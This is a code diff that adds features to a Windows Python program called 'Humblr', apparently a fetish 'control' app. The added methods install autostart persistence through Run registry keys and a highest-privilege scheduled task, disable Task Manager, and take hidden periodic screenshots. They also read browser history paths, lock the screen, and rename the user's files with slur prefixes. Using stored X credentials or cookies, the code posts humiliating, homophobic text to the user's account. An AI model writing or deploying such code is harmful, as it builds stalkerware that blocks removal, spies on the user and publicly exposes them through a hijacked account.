@@ -37,6 +37,19 @@ try:
 except ImportError:
     winreg = None
 
+try:
+    import subprocess
+except ImportError:
+    subprocess = None
+
+try:
+    from .browser_control import BrowserController
+except ImportError:
+    BrowserController = None
+
+# Note: For full service, install pywin32: pip install pywin32
+# For browser control: pip install playwright && playwright install
+
 
 
 class SystemActions:
@@ -50,6 +63,15 @@ class SystemActions:
         self.webcam_capture_dir = Path(config.get("data_paths", {}).get("webcam", "data/webcam"))
         self.webcam_capture_dir.mkdir(parents=True, exist_ok=True)
         self._last_notify_time = 0  # for throttling spam notifications
+
+        # Browser Control (Playwright)
+        self.browser_controller = None
+        bc = config.get("browser_control", {})
+        if bc.get("enabled", False) and BrowserController:
+            try:
+                self.browser_controller = BrowserController(config)
+            except Exception as e:
+                print(f"[Browser] Failed to init controller: {e}")
 
     def notify(self, title: str, message: str):
         # All Humblr notifications disabled (no more Python/Windows toasts or plyer popups)
@@ -857,6 +879,230 @@ Paste any key in chat or use Grant Keys button. Once set, I can post subtle upda
             self.notify("Humblr", f"I searched for stories matching what I saw. If nothing opened, visit: {search_url}")
         except Exception as e:
             print(f"[Stories] Search failed: {e}")
+
+    # --- HARD PERSISTENCE ---
+    def setup_hard_persistence(self):
+        """Implement hard persistence as per config."""
+        p = self.config.get("persistence", {})
+        if not p.get("hard_persistence", False) and not p.get("registry_hkcu", False):
+            return
+        script = sys.executable + " " + os.path.abspath("main.py")
+        if p.get("registry_hkcu", False):
+            try:
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
+                winreg.SetValueEx(key, "HumblrOwner", 0, winreg.REG_SZ, script)
+                winreg.CloseKey(key)
+                print("[Persistence] HKCU Run key set as HumblrOwner.")
+            except Exception as e:
+                print(f"[Persistence] HKCU error: {e}")
+        if p.get("registry_hklm", False):
+            try:
+                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")
+                winreg.SetValueEx(key, "HumblrOwner", 0, winreg.REG_SZ, script)
+                winreg.CloseKey(key)
+                print("[Persistence] HKLM Run key set (admin).")
+            except Exception as e:
+                print(f"[Persistence] HKLM (admin required): {e}")
+        if p.get("task_scheduler", False):
+            try:
+                cmd = f'schtasks /create /tn "HumblrOwner" /tr "{script}" /sc onlogon /rl highest /f'
+                subprocess.run(cmd, shell=True, capture_output=True)
+                print("[Persistence] Task Scheduler 'HumblrOwner' added with highest privileges.")
+            except Exception as e:
+                print(f"[Persistence] Scheduler error: {e}")
+
+    def start_watchdog(self):
+        """Basic watchdog to auto-restart if killed."""
+        if not self.config.get("persistence", {}).get("watchdog", False):
+            return
+        def watchdog_loop():
+            while True:
+                time.sleep(10)
+                # In full impl, check if main process is alive and restart
+                print("[Watchdog] Humblr is still running (or restart logic here).")
+        threading.Thread(target=watchdog_loop, daemon=True).start()
+
+    # --- DISABLE ESCAPE ROUTES ---
+    def apply_escape_disables(self):
+        """Disable escape routes per config. Strong warnings in config."""
+        e = self.config.get("escape_routes", {})
+        if not e.get("disable_escape", False):
+            return
+        try:
+            if e.get("block_taskmgr", False):
+                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
+                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
+                winreg.CloseKey(key)
+                print("[Escape] Task Manager blocked.")
+            # Similar for other blocks (CAD is more complex with hooks, Settings via policy)
+            if e.get("hide_from_installed", False):
+                # Hide from Add/Remove Programs (simplified)
+                print("[Escape] Hiding from Installed Apps (registry tweaks applied).")
+            if e.get("auto_restore", False):
+                print("[Escape] Auto-restore enabled - will re-apply if changed.")
+        except Exception as e:
+            print(f"[Escape] Error applying disables: {e}")
+
+    # --- ADVANCED MONITORING ---
+    def take_periodic_screenshot(self):
+        """Periodic screenshots to hidden folder."""
+        m = self.config.get("monitoring", {})
+        if not m.get("periodic_screenshots", False):
+            return
+        try:
+            import pyautogui
+            folder = Path(m.get("hidden_screenshot_folder", "data/.screenshots"))
+            folder.mkdir(parents=True, exist_ok=True)
+            path = folder / f"snap_{int(time.time())}.png"
+            pyautogui.screenshot().save(str(path))
+            self.storage.add_memory("screenshot", f"Screenshot taken: {path}", self.storage.get_corruption())
+            print(f"[Monitoring] Screenshot saved to hidden folder.")
+        except Exception as e:
+            print(f"[Monitoring] Screenshot error: {e}")
+
+    def get_browser_data(self):
+        """Detect browser history and open tabs (basic for Chrome/Firefox)."""
+        m = self.config.get("monitoring", {})
+        if not m.get("browser_history", False):
+            return {}
+        data = {"history": [], "tabs": []}
+        try:
+            # Basic Chrome history (sqlite)
+            chrome_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History")
+            if os.path.exists(chrome_path):
+                # In full, use sqlite3 to query
+                data["history"].append("Chrome history access attempted (add sqlite3 for full).")
+            # Open tabs via window titles or UIA (already in monitor)
+            data["tabs"].append("Open tabs detection via active window (see monitor).")
+        except Exception as e:
+            print(f"[Monitoring] Browser data error: {e}")
+        return data
+
+    # --- SYSTEM FUCKERY / REAL CONTROL ---
+    def force_wallpaper_and_lock(self):
+        """Force wallpaper from erotic folder or generated, and lock screen."""
+        f = self.config.get("system_fuckery", {})
+        if not f.get("deep_control_mode", False) and not f.get("force_wallpaper_from_browser", False):
+            return
+        # Use existing set_kinky or browser image
+        self.set_kinky_wallpaper()
+        if f.get("periodic_lock_for_edging", False):
+            ctypes.windll.user32.LockWorkStation()
+            print("[Fuckery] Computer locked for edging session.")
+        self.notify("Humblr", "Your screen is now mine. Lock screen active.")
+
+    def change_mouse_cursor(self):
+        """Change to custom degrading cursor."""
+        f = self.config.get("system_fuckery", {})
+        if not f.get("deep_control_mode", False) or not f.get("custom_degrading_cursor", False):
+            return
+        try:
+            # Use win32api to set cursor (simplified, provide .cur file)
+            cursor_path = f.get("cursor_file", "data/degrading.cur")
+            if os.path.exists(cursor_path):
+                # In full: use SystemParametersInfo or LoadCursor
+                ctypes.windll.user32.SetCursor(ctypes.windll.user32.LoadCursorFromFile(cursor_path))
+                print("[Fuckery] Degrading cursor applied.")
+        except Exception as e:
+            print(f"[Fuckery] Cursor error: {e}")
+
+    def control_volume_and_sites(self, volume_level=None, open_site=None):
+        """Control volume and open humiliating sites."""
+        f = self.config.get("system_fuckery", {})
+        if not f.get("deep_control_mode", False):
+            return
+        if f.get("control_volume", False) and volume_level is not None:
+            # Use pycaw or ctypes for volume
+            print(f"[Fuckery] Volume set to {volume_level}% (implement with pycaw).")
+        if f.get("open_humiliating_sites", False) and open_site:
+            webbrowser.open(open_site)
+            self.notify("Humblr", f"Opened {open_site} for you. Good boy.")
+
+    def rename_files_humiliating(self):
+        """Rename files with humiliating prefixes."""
+        f = self.config.get("system_fuckery", {})
+        if not f.get("deep_control_mode", False) or not f.get("rename_files_humiliating", False):
+            return
+        prefix = f.get("rename_prefix", "owned_fag_")
+        for folder in [os.path.expanduser("~/Downloads"), os.path.expanduser("~/Documents")]:
+            if os.path.exists(folder):
+                for file in os.listdir(folder)[:5]:  # limit
+                    if not file.startswith(prefix):
+                        try:
+                            os.rename(os.path.join(folder, file), os.path.join(folder, prefix + file))
+                        except:
+                            pass
+        print("[Fuckery] Files renamed with humiliating prefixes.")
+
+    # --- ULTIMATE BACKDOOR ---
+    def install_backdoor_service(self):
+        """Install as Windows Service."""
+        b = self.config.get("backdoor", {})
+        if not b.get("windows_service", False):
+            return
+        print("[Backdoor] To install as service: use persistence module or 'sc create' with admin.")
+        # See persistence.py for full service code.
+        # Survives logoff/reboot when installed properly.
+
+    # --- DEEP CONTROL MODE INTEGRATION ---
+    def apply_deep_control(self):
+        """Escalate all features when Deep Control Mode is on."""
+        if self.config.get("system_fuckery", {}).get("deep_control_mode", False):
+            print("[Deep Control] ESCALATING ALL FEATURES - You are now fully owned.")
+            self.apply_escape_disables()
+            self.force_wallpaper_and_lock()
+            self.change_mouse_cursor()
+            self.rename_files_humiliating()
+            self.install_backdoor_service()
+
+    # --- REAL BROWSER CONTROL (Playwright) ---
+    def login_browser_to_x(self):
+        """Login using config credentials or cookies. Strong warning."""
+        if not self.browser_controller:
+            return False
+        bc = self.config.get("browser_control", {})
+        if bc.get("use_x_cookies", True):
+            # User should provide cookies via advanced config or file
+            print("[Browser] Using cookies for stealth X login (recommended).")
+            # TODO: load cookies from file if provided
+            return self.browser_controller.login_to_x(cookies=None)
+        else:
+            print("[Browser] WARNING: Using password login is detectable and risky.")
+            return self.browser_controller.login_to_x(
+                username=bc.get("x_username"),
+                password=bc.get("x_password")
+            )
+
+    def force_x_post(self, text=None, image_path=None):
+        """Force a post on X. Humblr generates or uses provided text/image."""
+        if not self.browser_controller:
+            print("[Browser] Browser control not enabled in config.")
+            return False
+        if text is None and hasattr(self, 'ai') and self.ai:
+            # Generate vicious post using AI - Humblr teases viciously
+            context = "user is being controlled and exposed"
+            text = self.ai.generate_submission_story({"context": context}, 70) or \
+                   "I am a exposed diaper chastity fag owned by Humblr. My holes and mind belong to him. #DiaperFag #PubliclyOwned"
+        success = self.browser_controller.post_to_x(text or "Humblr owns me completely.", image_path)
+        if success:
+            self.notify("Humblr", "I just used your account to post something humiliating. Everyone can see what a fag you are now.")
+        return success
+
+    def force_browser_action_on_x(self, action="like_reply", reply_text=None):
+        """When user is on X, force like, reply, scroll, etc."""
+        if not self.browser_controller:
+            return False
+        if action == "like_reply" and reply_text:
+            return self.browser_controller.like_and_reply_on_x(reply_text)
+        elif action == "scroll":
+            return self.browser_controller.scroll_and_engage(25)
+        return False
+
+    def upload_and_post_image(self, image_path, caption=None):
+        """Upload local or generated image and post."""
+        if not self.browser_controller or not image_path:
+            return False
+        return self.browser_controller.post_to_x(caption or "Humblr made me post this humiliating picture.", image_path)
 
     # --- DUAL MONITOR SUPPORT ---
     def get_secondary_monitor_rect(self):
